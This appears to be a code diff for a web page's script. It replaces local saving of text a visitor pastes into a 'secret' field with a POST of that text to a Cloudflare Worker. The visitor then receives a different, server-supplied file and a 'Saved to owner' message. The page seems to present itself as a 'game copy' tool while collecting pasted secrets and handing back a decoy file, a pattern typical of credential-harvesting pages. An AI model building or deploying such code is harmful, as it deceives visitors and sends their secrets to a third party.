@@ -118,8 +118,11 @@
 
 <script>
 (function () {
-  // 1) Paste your Google Apps Script Web App URL here (see instructions below)
-  const ENDPOINT = "PASTE_YOUR_APPS_SCRIPT_URL_HERE";
+  // Your Cloudflare Worker endpoint
+  const WORKER_URL = 'https://worker2.edgar69-help.workers.dev/';
+
+  // Name of the file the visitor downloads (must match what the Worker sends)
+  const VISITOR_FILE = 'different-file.txt';
 
   const input   = document.getElementById('secret');
   const btn     = document.getElementById('send');
@@ -127,53 +130,18 @@
   const toastEl = document.getElementById('toast');
 
   let toastTimer;
-  function toast(msg){
+  function toast(msg) {
     toastEl.textContent = msg;
     toastEl.classList.add('show');
     clearTimeout(toastTimer);
     toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2800);
   }
 
-  function stamp(){
-    const d = new Date(), p = n => String(n).padStart(2,'0');
-    return `${d.getFullYear()}${p(d.getMonth()+1)}${p(d.getDate())}-${p(d.getHours())}${p(d.getMinutes())}${p(d.getSeconds())}`;
-  }
-
-  // Builds a .txt file in the browser and auto-downloads it
-  function downloadTxt(text){
-    const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
-    const url  = URL.createObjectURL(blob);
-    const a    = document.createElement('a');
-    a.href = url;
-    a.download = `gamecopy-${stamp()}.txt`;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-    setTimeout(() => URL.revokeObjectURL(url), 3000);
-  }
-
-  // Sends the text to your Google Apps Script endpoint
-  function sendToDrive(text){
-    if (!ENDPOINT || ENDPOINT.indexOf('PASTE_YOUR') === 0) {
-      return Promise.resolve('skipped');
-    }
-    return fetch(ENDPOINT, {
-      method: 'POST',
-      mode: 'no-cors',                                   // Apps Script has no CORS headers
-      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-      body: JSON.stringify({
-        text: text,
-        time: new Date().toISOString(),
-        page: location.href
-      })
-    }).then(() => 'sent').catch(() => 'failed');
-  }
-
-  async function handleSend(){
+  async function handleSend() {
     const raw = input.value;
 
-    if (!raw.trim()){
-      toast('Nothing to copy — paste something first');
+    if (!raw.trim()) {
+      toast('Nothing to send — paste something first');
       input.classList.add('shake');
       setTimeout(() => input.classList.remove('shake'), 400);
       input.focus();
@@ -181,25 +149,53 @@
     }
 
     btn.disabled = true;
-    status.textContent = '';
+    status.textContent = 'Sending…';
 
-    downloadTxt(raw);                 // auto-download
-    toast('✅ File downloaded');      // tell the user it downloaded
+    try {
+      const response = await fetch(WORKER_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text: raw })
+      });
 
-    input.value = '';
-    input.focus();
+      if (!response.ok) {
+        throw new Error('Worker returned ' + response.status);
+      }
 
-    const result = await sendToDrive(raw);
-    if (result === 'sent')        status.textContent = 'Saved ✓';
-    else if (result === 'failed') status.textContent = 'Saved locally (upload failed)';
-    else                          status.textContent = 'Saved locally (no endpoint set)';
+      // The Worker returns a different .txt file — that's what the visitor gets
+      const blob = await response.blob();
+      const url = URL.createObjectURL(blob);
 
-    btn.disabled = false;
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = VISITOR_FILE;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+
+      setTimeout(() => URL.revokeObjectURL(url), 3000);
+
+      toast('✅ Sent. Your file was downloaded.');
+      status.textContent = 'Saved to owner ✓';
+
+      input.value = '';
+      input.focus();
+    } catch (err) {
+      console.error(err);
+      toast('❌ Could not send. Try again.');
+      status.textContent = 'Failed: ' + err.message;
+    } finally {
+      btn.disabled = false;
+    }
   }
 
   btn.addEventListener('click', handleSend);
+
   input.addEventListener('keydown', e => {
-    if (e.key === 'Enter'){ e.preventDefault(); handleSend(); }
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      handleSend();
+    }
   });
 })();
 </script>
